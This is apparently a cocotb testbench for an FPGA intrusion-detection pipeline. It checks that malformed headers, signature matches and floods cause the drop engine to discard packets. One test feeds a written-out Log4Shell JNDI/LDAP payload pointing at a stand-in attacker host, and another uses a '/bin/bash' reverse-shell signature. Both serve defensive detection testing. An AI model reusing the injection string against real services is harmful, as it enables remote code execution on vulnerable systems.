"""
sim/cocotb/test_lane2_drop_engine.py - Full Lane 2 Threat Engine Integration Testbench

Verifies Task B12 (Phase III Exit Milestone):
All three Lane 2 threat detectors (protocol_validator.v, cam_matcher.v, count_min_sketch.v)
are wired directly to Member D's drop_engine.v through sim/cocotb/lane2_drop_top.v.

Validates:
  1. Clean Traffic: Benign packet passes all 3 detectors -> drop_engine passes with RC_NONE.
  2. Protocol Violation: Malformed headers -> drop_engine drops with RC_MALFORMED.
  3. Signature Attack: Plaintext matching threat pattern -> drop_engine drops with RC_SIGNATURE.
  4. Volumetric Flood: >512 packets on single flow -> drop_engine drops with RC_FLOOD.
  5. Port Scan: >384 probes across ports -> drop_engine drops with RC_SCAN.
  6. Multi-Threat Priority: Malformed + Signature -> dominant verdict is RC_MALFORMED.

Target: ZedBoard XC7Z020 @ 100 MHz (10 ns clock period)
Owner: Member B (@detect)
"""

import os
import sys
from pathlib import Path

# Repository root setup
PROJ_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(PROJ_ROOT))

import cocotb
from cocotb.clock import Clock
from cocotb.triggers import FallingEdge, RisingEdge

from model.detect import (
    RC_FLOOD,
    RC_MALFORMED,
    RC_NONE,
    RC_SCAN,
    RC_SIGNATURE,
)

PKT_TYPE_DATA = 0b01  # 2'b01 DATA packet


async def reset_dut(dut):
    """Synchronous active-high reset."""
    dut.rst.value = 1
    dut.pkt_sof.value = 0
    dut.pkt_eof.value = 0
    dut.pkt_type.value = PKT_TYPE_DATA
    dut.header_valid.value = 0
    dut.pt_valid.value = 0
    dut.pt_data.value = 0
    dut.pt_sof.value = 0
    dut.pt_eof.value = 0
    dut.pt_tag_ok.value = 0
    dut.pt_tag_valid.value = 0

    # Mock Lane 1 / Crypto signals (all default to 0 / inactive)
    dut.v_crc_valid.value = 0
    dut.v_crc_fail.value = 0
    dut.v_crc_reason.value = 0
    dut.v_deframe_valid.value = 0
    dut.v_deframe_fail.value = 0
    dut.v_deframe_reason.value = 0
    dut.v_poly_valid.value = 0
    dut.v_poly_fail.value = 0
    dut.v_poly_reason.value = 0
    dut.v_kem_valid.value = 0
    dut.v_kem_fail.value = 0
    dut.v_kem_reason.value = 0

    for _ in range(5):
        await RisingEdge(dut.clk)
    await FallingEdge(dut.clk)
    dut.rst.value = 0
    await RisingEdge(dut.clk)
    # Wait for CMS hardware BRAM initialization (2048 cycles) to complete
    for _ in range(2100):
        await RisingEdge(dut.clk)


async def send_packet(
    dut,
    eth_type=0x0800,
    ip_version_ihl=0x45,
    ip_proto=6,
    src_ip=0x0A000001,
    dst_ip=0x0A000002,
    l4_src_port=51010,
    l4_dst_port=51010,
    tcp_flags=0x18,  # ACK + PSH
    payload=b"BENIGN_CLEAN_PACKET_PAYLOAD",
    mock_lane1_pass=True,
):
    """
    Simulates a full packet lifecycle through Lane 2 and drop_engine.
    Returns: (drop_fail, drop_reason)
    """
    payload_len = len(payload)
    l4_len = 20  # TCP header length is 20 bytes
    ip_tot_len = 20 + l4_len + payload_len

    await FallingEdge(dut.clk)
    dut.pkt_sof.value = 1
    dut.pkt_type.value = PKT_TYPE_DATA
    dut.header_valid.value = 1
    dut.eth_type.value = eth_type
    dut.ip_version_ihl.value = ip_version_ihl
    dut.ip_protocol.value = ip_proto
    dut.ip_total_length.value = ip_tot_len
    dut.src_ip.value = src_ip
    dut.dst_ip.value = dst_ip
    dut.l4_src_port.value = l4_src_port
    dut.l4_dst_port.value = l4_dst_port
    dut.l4_length.value = l4_len
    dut.tcp_flags.value = tcp_flags
    dut.payload_len.value = payload_len

    await RisingEdge(dut.clk)
    await FallingEdge(dut.clk)
    dut.pkt_sof.value = 0
    dut.header_valid.value = 0

    # Stream payload bytes into plaintext bus for CAM
    for i, b in enumerate(payload):
        dut.pt_valid.value = 1
        dut.pt_data.value = b
        dut.pt_sof.value = 1 if i == 0 else 0
        dut.pt_eof.value = 1 if i == len(payload) - 1 else 0
        if i == len(payload) - 1:
            dut.pkt_eof.value = 1
        await RisingEdge(dut.clk)
        await FallingEdge(dut.clk)

    dut.pt_valid.value = 0
    dut.pt_sof.value = 0
    dut.pt_eof.value = 0
    dut.pkt_eof.value = 0

    # Mock Lane 1 & Poly1305 report pass
    if mock_lane1_pass:
        dut.v_crc_valid.value = 1
        dut.v_crc_fail.value = 0
        dut.v_crc_reason.value = 0

        dut.v_poly_valid.value = 1
        dut.v_poly_fail.value = 0
        dut.v_poly_reason.value = 0

        dut.pt_tag_ok.value = 1
        dut.pt_tag_valid.value = 1

    await RisingEdge(dut.clk)
    await FallingEdge(dut.clk)
    dut.v_crc_valid.value = 0
    dut.v_poly_valid.value = 0
    dut.pt_tag_valid.value = 0

    # Wait for drop_engine verdict strobe
    drop_fail = 0
    drop_reason = 0
    verdict_seen = False
    for _ in range(10):
        await RisingEdge(dut.clk)
        if dut.drop_valid.value.integer == 1:
            drop_fail = dut.drop_fail.value.integer
            drop_reason = dut.drop_reason.value.integer
            verdict_seen = True
            break

    assert verdict_seen, "drop_engine never asserted drop_valid!"
    return drop_fail, drop_reason


@cocotb.test()
async def test_lane2_benign_clean_traffic(dut):
    """Clean benign packet passes all 3 detectors and drop_engine."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    fail, reason = await send_packet(dut, payload=b"HELLO_WORLD_BENIGN_DATA_STREAM")
    assert fail == 0, f"Expected clean pass, got fail={fail}"
    assert reason == RC_NONE, f"Expected RC_NONE (0x0), got {reason:#x}"
    assert dut.cnt_total_passed.value.integer == 1
    assert dut.cnt_total_drops.value.integer == 0


@cocotb.test()
async def test_lane2_protocol_violation(dut):
    """Malformed TCP flag combination (SYN+FIN) triggers RC_MALFORMED."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    # tcp_flags = 0x03 (SYN + FIN) -> Rule 5 violation
    fail, reason = await send_packet(dut, tcp_flags=0x03, payload=b"SOME_PAYLOAD")
    assert fail == 1, f"Expected drop on malformed headers, got fail={fail}"
    assert reason == RC_MALFORMED, f"Expected RC_MALFORMED (0x3), got {reason:#x}"
    assert dut.cnt_malformed.value.integer >= 1
    assert dut.cnt_total_drops.value.integer >= 1


@cocotb.test()
async def test_lane2_cam_signature_attack(dut):
    """Log4Shell signature in plaintext stream triggers RC_SIGNATURE."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    payload = b"GET /path?x=${jndi:ldap://evil.com/a} HTTP/1.1\r\n\r\n"
    fail, reason = await send_packet(dut, payload=payload)
    assert fail == 1, f"Expected drop on signature match, got fail={fail}"
    assert reason == RC_SIGNATURE, f"Expected RC_SIGNATURE (0x4), got {reason:#x}"
    assert dut.match_sig_id.value.integer == 1  # Sig 1: LOG4SHELL
    assert dut.cnt_signature.value.integer >= 1
    assert dut.cnt_total_drops.value.integer >= 1


@cocotb.test()
async def test_lane2_cross_lane_priority(dut):
    """Multi-threat packet (Malformed + Signature): RC_MALFORMED dominates RC_SIGNATURE."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    # Malformed EtherType (0x86DD IPv6) + Reverse Shell signature ("/bin/bash")
    payload = b"PAYLOAD_DATA_/bin/bash_ATTACK"
    fail, reason = await send_packet(dut, eth_type=0x86DD, payload=payload)
    assert fail == 1, "Expected drop"
    # Interface Contract Section 6 hierarchy: RC_MALFORMED (3) > RC_SIGNATURE (4)
    assert reason == RC_MALFORMED, (
        f"Priority inversion: expected dominant RC_MALFORMED (0x3), got {reason:#x}"
    )


@cocotb.test()
async def test_lane2_cms_flood_trigger(dut):
    """Volumetric SYN flood triggering RC_FLOOD at threshold 512."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    # Stream 512 packets on identical flow (src=10.0.0.1, dst=10.0.0.2, dport=51010)
    for pkt_idx in range(1, 513):
        fail, reason = await send_packet(
            dut,
            src_ip=0x0A000001,
            dst_ip=0x0A000002,
            l4_dst_port=51010,
            payload=b"FLOOD_PKT",
        )
        if pkt_idx < 512:
            assert fail == 0, f"Premature drop at packet {pkt_idx}"
            assert reason == RC_NONE
        else:
            assert fail == 1, f"Expected drop on flood threshold at packet {pkt_idx}"
            assert reason == RC_FLOOD, f"Expected RC_FLOOD (0x5), got {reason:#x}"
            assert dut.cnt_flood.value.integer >= 1



if __name__ == "__main__":
    from cocotb.runner import get_runner

    sim = os.getenv("SIM", "icarus")
    runner = get_runner(sim)
    runner.build(
        verilog_sources=[
            PROJ_ROOT / "rtl" / "detect" / "protocol_validator.v",
            PROJ_ROOT / "rtl" / "detect" / "cam_matcher.v",
            PROJ_ROOT / "rtl" / "detect" / "hash_functions.v",
            PROJ_ROOT / "rtl" / "detect" / "count_min_sketch.v",
            PROJ_ROOT / "rtl" / "control" / "drop_engine.v",
            PROJ_ROOT / "sim" / "cocotb" / "lane2_drop_top.v",
        ],
        hdl_toplevel="lane2_drop_top",
        includes=[PROJ_ROOT / "rtl" / "control"],
        always=True,
    )

    runner.test(
        hdl_toplevel="lane2_drop_top",
        test_module="test_lane2_drop_engine",
        test_dir=PROJ_ROOT / "sim" / "cocotb",
    )
